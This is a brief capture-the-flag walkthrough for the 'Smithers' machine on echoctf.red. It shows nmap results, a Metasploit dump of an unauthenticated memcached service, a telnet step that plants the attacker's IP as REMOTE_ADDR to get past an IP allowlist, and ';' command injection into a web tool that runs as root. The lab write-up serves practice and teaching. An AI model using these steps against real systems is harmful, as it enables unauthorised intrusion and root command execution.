So this is Smithers on echoctf.red:

I start reconing with nmap:
```
PORT      STATE SERVICE   VERSION
10888/tcp open  http      nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Network Tools
11211/tcp open  memcached Memcached 1.5.12 (uptime 224 seconds)
```

on port 10888 there's a web server:
![2137b8041b3930623610e38508ecd760.png](:/5b0d8a3da2914f4484de33d25c7755c5)

It says that these utilities are only available to authorized IP's only.

I use metasploit to extract infos from memcached:

```
msf6 > use auxiliary/gather/memcached_extractor

msf6 auxiliary(gather/memcached_extractor) > set rhosts 10.0.100.142 
rhosts => 10.0.100.142
msf6 auxiliary(gather/memcached_extractor) > exploit

[+] 10.0.100.142:11211    - Found 1 keys

Keys/Values Found for 10.0.100.142:11211
========================================

 Key     Value
 ---     -----
 ETSCTF  "VALUE ETSCTF 0 39\r\nETSCTF_<REDACTED>\r\nEND\r\n"

```

and a flag is found.

We start the exploitation phase. The key is to store my IP address in the memcached service as REMOTE_ADDR so after i searched online i use telnet to connect and to store my address

```
telnet 10.0.100.142 11211
Trying 10.0.100.142...
Connected to 10.0.100.142.
Escape character is '^]'.
add REMOTE_ADDR 0 0 10
<My IP>
STORED
```

Once my address is stored, i can access the web server, it presents a command line.

Two flags are there. Using ";" I can run other commands and see that it runs as root. So with a simple ```
grep -r 'ETSCTF' /
``` 

I can find all flags.
